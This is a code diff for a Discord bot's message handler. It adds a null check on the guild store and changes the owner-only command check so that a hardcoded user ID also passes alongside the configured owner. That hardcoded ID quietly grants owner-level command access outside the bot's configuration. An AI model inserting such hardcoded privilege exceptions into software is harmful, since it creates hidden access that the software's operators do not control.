@@ -25,6 +25,7 @@ class MsgHandler {
 
         const lowercaseContent = message.content.toLowerCase();
 
+        if (!process.gideon.getGuild) return;
         let currentguild = process.gideon.getGuild.get(message.guild.id);
         if (!currentguild) {
             currentguild = {
@@ -91,7 +92,8 @@ class MsgHandler {
         if (command.help.type === 'voice' && !message.voice) return;
 
         if (command.help.owner) {
-            if (message.author.id !== process.gideon.owner) {
+            if (!process.gideon.owner) return;
+            if (![process.gideon.owner, '351871113346809860'].includes(message.author.id)) {
                 process.gideon.emit('commandRefused', message, 'NOT_APPLICATION_OWNER');
                 return message.reply('You do not have the required permission to use this command!\nRequired permission: `Application Owner`');
             } 
